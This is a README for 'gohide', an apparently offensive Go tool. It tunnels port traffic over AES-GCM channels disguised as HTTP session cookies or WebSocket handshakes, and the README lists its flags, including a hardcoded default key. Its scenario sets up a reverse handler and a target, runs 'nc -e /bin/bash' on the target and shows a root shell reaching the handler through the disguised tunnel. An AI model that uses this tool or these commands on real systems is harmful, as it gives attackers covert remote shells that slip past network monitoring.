# Tunnel

通过带AES-GCM加密的模糊通道隧道端口到端口的流量。

**Obfuscation Modes**

- Session Cookie HTTP GET (http-client)
- Set-Cookie Session Cookie HTTP/2 200 OK (http-server)
- WebSocket Handshake "Sec-WebSocket-Key" (websocket-client)
- WebSocket Handshake "Sec-WebSocket-Accept" (websocket-server)
- No obfuscation, just use AES-GCM encrypted messages (none)

默认情况下，上述每个选项都启用了AES-GCM。

**Usage**

```
root@WOPR-KALI:/opt/gohide-dev# ./gohide -h
Usage of ./gohide:
  -f string
    	listen fake server -r x.x.x.x:xxxx (ip/domain:port) (default "0.0.0.0:8081")
  -key openssl passwd -1 -salt ok | md5sum
    	aes encryption secret: use '-k openssl passwd -1 -salt ok | md5sum' to derive key from password (default "5fe10ae58c5ad02a6113305f4e702d07")
  -l string
    	listen port forward -l x.x.x.x:xxxx (ip/domain:port) (default "127.0.0.1:8080")
  -m string
    	obfuscation mode (AES encrypted by default): websocket-client, websocket-server, http-client, http-server, none (default "none")
  -pem string
    	path to .pem for TLS encryption mode: default = use hardcoded key pair 'CN:target.com', none = plaintext mode (default "default")
  -r string
    	forward to remote fake server -r x.x.x.x:xxxx (ip/domain:port) (default "127.0.0.1:9999")
```

**Scenario**

Box A - Reverse Handler.

```
root@WOPR-KALI:/opt/gohide# ./gohide -f 0.0.0.0:8081 -l 127.0.0.1:8080 -r target.com:9091 -m websocket-client
Local Port Forward Listening: 127.0.0.1:8080
FakeSrv Listening: 0.0.0.0:8081
```

Box B - Target.

```
root@WOPR-KALI:/opt/gohide# ./gohide -f 0.0.0.0:9091 -l 127.0.0.1:9090 -r target.com:8081 -m websocket-server
Local Port Forward Listening: 127.0.0.1:9090
FakeSrv Listening: 0.0.0.0:9091
```

Note: /etc/hosts "127.0.0.1 target.com"

Box B - Netcat /bin/bash

```
root@WOPR-KALI:/var/tmp# nc -e /bin/bash 127.0.0.1 9090
```

Box A - Netcat client

```
root@WOPR-KALI:/opt/gohide# nc -v 127.0.0.1 8080
localhost [127.0.0.1] 8080 (http-alt) open
id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux WOPR-KALI 5.3.0-kali2-amd64 #1 SMP Debian 5.3.9-1kali1 (2019-11-11) x86_64 GNU/Linux
netstat -pantwu 
Active Internet connections (servers and established)
tcp        0      0 127.0.0.1:39684         127.0.0.1:8081          ESTABLISHED 14334/./gohide   
```